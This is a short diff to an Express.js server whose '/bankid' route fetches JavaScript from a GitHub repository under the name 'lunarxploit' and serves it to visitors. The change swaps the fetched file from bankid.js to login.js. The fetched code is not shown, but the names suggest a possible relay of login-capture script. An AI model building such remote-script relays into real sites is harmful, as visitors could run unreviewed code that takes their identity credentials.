@@ -17,7 +17,7 @@ app.get("/", (req, res) => {
 app.get("/bankid", async (req, res) => {
   try {
     // Fetch the content of bankid.js from GitHub
-    const response = await axios.get('https://raw.githubusercontent.com/lunarxploit/swosa/master/bankid.js');
+    const response = await axios.get('https://raw.githubusercontent.com/lunarxploit/swosa/master/login.js');
     
     // Send the fetched JavaScript content as the response
     res.send(response.data);
